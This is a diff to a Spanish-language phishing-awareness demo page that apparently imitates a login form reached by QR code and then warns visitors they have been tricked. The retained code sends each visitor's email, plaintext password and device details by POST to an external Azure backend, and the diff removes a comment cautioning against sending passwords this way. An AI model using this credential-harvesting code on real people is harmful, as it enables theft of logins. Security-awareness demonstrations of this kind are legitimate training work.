@@ -167,7 +167,7 @@
             color: #155724;
         }
 
-        /* **** PASO 3: AÑADIR ESTILOS CSS PARA LOS ÍCONOS AQUÍ **** */
+        /* Estilos CSS para los íconos */
         .social-login-info {
             margin-top: 25px;
             border-top: 1px solid #eee;
@@ -234,6 +234,7 @@
                 <i class="fab fa-apple" title="Iniciar sesión con Apple"></i>
             </div>
         </div>
+        
         <div id="warning" class="warning">
             <strong>⚠️ ALTO - Esto fue una demostración de QRphishing</strong>
             <p>Acabas de proporcionar información sensible a un sitio desconocido. Veamos qué datos recolecté sobre ti:</p>
@@ -288,15 +289,10 @@
         return 'Escritorio';
     }
     
-    // --- MODIFICACIÓN CLAVE: Enviar datos al backend ---
-    
     // Función para enviar datos al backend
     async function sendDataToBackend(endpoint, data) {
         try {
-            // **IMPORTANTE**: Si tu backend está en un servidor real, reemplaza 'http://localhost:5000'
-            // con la URL pública de tu backend (por ejemplo, https://tu-backend-demo.azurewebsites.net)
-            // Si lo estás probando localmente, 'http://localhost:5000' es correcto.
-            const response = await fetch(`https://qr-eedjftcsfrcja7h3.chilecentral-01.azurewebsites.net${endpoint}`, { // ¡Esta es la URL de tu backend en Azure!
+            const response = await fetch(`https://qr-eedjftcsfrcja7h3.chilecentral-01.azurewebsites.net${endpoint}`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -331,7 +327,7 @@
         // Enviar datos de la sumisión al backend
         const submissionData = {
             email: email,
-            password: password, // Precaución: En demo ok, en real NUNCA enviar así
+            password: password,
             device_info: deviceInfo
         };
         await sendDataToBackend('/api/track-submission', submissionData);
